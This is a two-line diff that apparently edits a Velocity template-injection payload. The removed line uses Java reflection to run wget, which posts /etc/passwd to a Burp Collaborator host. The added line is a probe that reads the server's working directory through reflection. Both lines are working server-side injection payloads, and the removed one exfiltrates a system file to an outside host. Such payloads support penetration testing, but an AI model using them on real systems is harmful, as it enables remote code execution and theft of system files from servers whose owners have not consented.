@@ -1,1 +1,2 @@
-$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('wget --post-file /etc/passwd http://vwvgbgsg0k309gemkm1m3rrj7ad11q.burpcollaborator.net/rcetest?a=a').waitFor()
+#set($e="e")
+$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'user.dir').toString()
